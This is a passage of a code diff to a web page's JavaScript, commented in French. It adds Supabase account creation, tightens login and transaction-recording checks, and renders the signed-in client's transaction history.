+  // 1. Créer un nouveau compte client
+  async function creerCompteClient(email, password, nom) {
+    const { data, error } = await supabase.auth.signUp({
+      email: email,
+      password: password,
+      options: { data: { full_name: nom } }
+    });
+
+    if (error) {
+      alert("Erreur lors de la création : " + error.message);
+    } else {
+      alert("Compte créé avec succès !");
+      if (data.user) {
+        chargerHistoriqueClient(data.user.id);
+        connexionReussie();
+      }
+    }
+  }
+
+  // 2. Fonction de connexion du client
   async function connecterClient(email, password) {
     const { data, error } = await supabase.auth.signInWithPassword({
       email: email,
@@ -613,16 +549,19 @@ window.onload = function() {
       alert("Erreur de connexion : " + error.message);
     } else {
       alert("Connexion réussie !");
-      chargerHistoriqueClient(data.user.id);
+      if (data.user) {
+        chargerHistoriqueClient(data.user.id);
+        connexionReussie();
+      }
     }
   }
 
-  // 2. Enregistrer une nouvelle opération/transaction
+  // 3. Enregistrer une nouvelle opération/transaction
   async function enregistrerOperation(typeOperation, montant, description) {
-    const user = (await supabase.auth.getUser()).data.user;
+    const { data: { user } } = await supabase.auth.getUser();
 
     if (!user) {
-      alert("Vous devez être connecté pour effectuer cette opération.");
+      console.error("Utilisateur non connecté pour enregistrer la transaction.");
       return;
     }
 
@@ -630,22 +569,21 @@ window.onload = function() {
       {
         user_id: user.id,
         type: typeOperation,
-        montant: montant,
+        montant: parseFloat(montant),
         description: description,
         created_at: new Date()
       }
     ]);
 
     if (error) {
-      console.error("Erreur lors de l'enregistrement :", error.message);
-      alert("Erreur lors de l'enregistrement de l'opération.");
+      console.error("Erreur Supabase lors de l'enregistrement :", error.message);
     } else {
-      alert("Opération enregistrée avec succès !");
+      console.log("Opération enregistrée dans Supabase avec succès.");
       chargerHistoriqueClient(user.id);
     }
   }
 
-  // 3. Charger et affichera l'historique du client connecté
+  // 4. Charger l'historique du client connecté
   async function chargerHistoriqueClient(userId) {
     const { data: transactions, error } = await supabase
       .from('transactions')
@@ -658,15 +596,16 @@ window.onload = function() {
       return;
     }
 
-    console.log("Historique récupéré :", transactions);
-    // Les données reçues peuvent être injectées dans votre tableau d'affichage
+    donneesUtilisateurActuel.transactions = transactions || [];
+    afficherHistoriqueUI();
   }
 
-  // 4. Vérifier automatiquement si le client est déjà connecté au chargement de la page
+  // 5. Vérification automatique de session au chargement
   window.addEventListener('DOMContentLoaded', async () => {
     const { data: { session } } = await supabase.auth.getSession();
     if (session) {
       chargerHistoriqueClient(session.user.id);
+      connexionReussie();
     }
   });
 </script>
